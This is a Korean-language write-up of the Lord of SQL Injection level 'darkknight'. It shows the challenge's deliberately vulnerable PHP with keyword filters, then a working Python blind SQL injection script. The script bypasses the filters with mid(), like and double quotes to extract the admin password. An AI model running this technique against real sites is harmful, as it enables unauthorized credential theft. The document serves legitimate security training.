# Lord of SQL Injection No.12 - darkknight

## 문제 출제 의도

substr를 우회하여 Blind SQL Injection을 할 수 있는지 확인한다.

## 소스 코드 분석
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```
* preg_match에서 no의 'prob','_','.','()','substr','ascii'을 찾아 있는지 없는지 필터링 한다.

* preg_match에서 pw의 '를 찾아 있는지 없는지 필터링 한다.

* Blind SQL Injection 문제임을 알 수 있다.

## 문제 해결 방안

```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수

for i in range(1,9):
    for j in range(ord('0'),ord('z')):
        url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="  # SQL Injection 공격 대상인 URL에서 변경되지 않는 부분이다.
        add_url = '-1 or mid(pw,1,{}) like "{}" -- -'.format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=ae1i7c038nndgup1torche1pt7")

        res = urllib.request.urlopen(re)

        if str(res.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : " + result)
```

* substr 대체함수로 mid함수를 이용한다.
### mid()
    첫번째 인자의 문자열에서 두번째 인자부터 세번째 인자 사이의 문자열을 반환한다.

* id='guest'를 무력화 시켜야 되기에 굳이 pw의 값을 넘겨줄 필요가 없으므로 no의 값을 바꿔주며 입력한다.

* no는 '를 preg_match하므로 "를 이용해준다. SQL에서 '와 "는 같은 기능을 하기 때문이다.

코드의 실행결과 1c62ba6f가 출력되므로 pw=1c62ba6f를 입력하게 되면 문제가 해결된다.